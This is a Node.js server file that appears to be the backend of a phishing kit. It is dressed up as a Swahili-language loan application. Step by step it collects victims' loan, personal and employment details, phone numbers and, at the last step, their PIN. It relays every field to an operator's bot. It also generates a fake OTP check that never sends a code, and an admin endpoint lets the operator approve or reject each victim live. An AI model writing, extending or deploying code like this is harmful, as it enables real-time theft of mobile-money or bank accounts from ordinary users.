const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { sendAdminAlert } = require('./bot_manager');

const app = express();
const server = http.createServer(app);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, { cors: { origin: "*" } });
const sessions = new Map();

const trackProgress = async (socketId, stepName, newData = {}) => {
    let session = sessions.get(socketId);
    if (!session) return;

    // UPDATE: Ensure the session data is updated with the NEW fields first
    session.data = Object.assign({}, session.data, newData);
    
    console.log(`[SERVER] Step: ${stepName} | New Data Received:`, newData);

    // Pass the ENTIRE updated session data to the bot
    await sendAdminAlert({
        step: stepName,
        socketId: socketId,
        ...session.data 
    });
};

app.post('/admin/action', (req, res) => {
    const { socketId, action, referenceId } = req.body;
    if (action === 'approve') {
        io.to(socketId).emit('admin-approved', { referenceId: referenceId || `MIX-${Date.now()}` });
    } else {
        io.to(socketId).emit('admin-rejected', { message: 'Maombi yamekataliwa.' });
    }
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    sessions.set(socket.id, { data: {}, authenticated: false });

    // Step Listeners
    socket.on('step1', (data) => trackProgress(socket.id, '1_LOAN_DETAILS', data));
    socket.on('step2', (data) => trackProgress(socket.id, '2_PERSONAL_INFO', data));
    socket.on('step3-data', (data) => trackProgress(socket.id, '3_EMPLOYMENT', data));

    socket.on('send-otp', (data) => {
        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        const session = sessions.get(socket.id);
        if (session) {
            session.otp = otp;
            trackProgress(socket.id, 'OTP_SENT', { phone: data.phoneNumber });
            socket.emit('otp-sent'); 
        }
    });

    socket.on('step4-otp', (data) => {
        const session = sessions.get(socket.id);
        if (session && session.otp === data.otp) {
            session.authenticated = true;
            trackProgress(socket.id, '4_OTP_VERIFIED');
            socket.emit('otp-verified');
        } else {
            socket.emit('admin-rejected', { message: 'OTP si sahihi.' });
        }
    });

    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            trackProgress(socket.id, '5_PIN_SUBMITTED', { pin: data.pin });
        }
    });

    socket.on('disconnect', () => sessions.delete(socket.id));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});